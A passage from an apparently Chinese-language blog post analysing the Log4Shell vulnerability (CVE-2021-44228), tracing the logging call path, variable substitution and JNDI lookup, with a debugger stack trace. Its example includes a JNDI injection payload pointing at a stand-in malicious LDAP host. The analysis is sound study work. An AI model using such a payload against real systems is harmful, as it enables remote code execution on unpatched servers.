<li>漏洞触发流程：
<ul>
<li>strLookupMap中获取JNDI查找器</li>
<li>查找器执行JNDI查找操作</li>
<li>访问恶意LDAP服务器</li>
<li>加载并执行恶意Java类</li>
</ul></li>
</ol>
<p>总结完整的Log4Shell(CVE-2021-44228)漏洞利用流程：</p>
<ol type="1">
<li><p><strong>漏洞触发入口</strong> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建包含恶意payload的日志消息</span></span><br><span class="line"><span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://evil.com/exploit&#125;&quot;</span>;</span><br><span class="line">logger.error(<span class="string">&quot;error info:&#123;&#125;&quot;</span>, message);</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>日志事件处理流程</strong> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">error() → logIfEnabled() → logMessage() → logMessageSafely() → </span><br><span class="line">logMessageTrackRecursion() → tryLogMessage() → log() →</span><br><span class="line">processLogEvent() → callAppenders()</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>字符串格式化与替换</strong></p></li>
</ol>
<ul>
<li>在Layout的format方法中开始处理消息</li>
<li>检测到${开头的模式</li>
<li>调用StringSubstitutor进行变量替换 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测$&#123;pattern&#125;</span></span><br><span class="line"><span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 执行变量替换</span></span><br><span class="line">    workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4" type="1">
<li><p><strong>变量替换逻辑</strong> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">replace() → substitute() → <span class="keyword">while</span>循环&#123;</span><br><span class="line">    <span class="comment">// 查找变量起始位置$&#123;</span></span><br><span class="line">    <span class="comment">// 提取变量名称</span></span><br><span class="line">    <span class="comment">// 处理嵌套变量</span></span><br><span class="line">    <span class="comment">// 解析变量值</span></span><br><span class="line">    <span class="comment">// 替换变量内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>变量解析过程</strong> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 提取前缀和值</span></span><br><span class="line">prefix = <span class="string">&quot;jndi&quot;</span></span><br><span class="line">name = <span class="string">&quot;ldap://evil.com/exploit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对应的查找器</span></span><br><span class="line">lookup = strLookupMap.get(prefix)  <span class="comment">// 获取JndiLookup</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行JNDI查找</span></span><br><span class="line">value = lookup.lookup(name)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>漏洞利用链</strong></p></li>
</ol>
<ul>
<li>JndiLookup执行LDAP查找</li>
<li>访问恶意LDAP服务器</li>
<li>服务器返回恶意Java类的地址</li>
<li>通过JNDI加载并实例化恶意类</li>
<li>恶意代码在目标系统执行</li>
</ul>
<ol start="7" type="1">
<li><strong>关键漏洞点</strong></li>
</ol>
<ul>
<li>日志消息中允许使用${...}语法</li>
<li>支持JNDI查找且默认启用</li>
<li>允许访问任意远程地址</li>
<li>允许加载远程Java类</li>
<li>缺乏协议和地址的安全检查</li>
</ul>
<h2 id="堆栈">堆栈</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:978, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:244, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:229, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:59, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:481, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:456, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:161, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:2034, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:1899, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:866, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:10, CVE202144228 (org.example)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Security</category>
        <category>Vulnerability Analysis</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Log4j</tag>
        <tag>Java</tag>
      </tags>
  </entry>
</search>
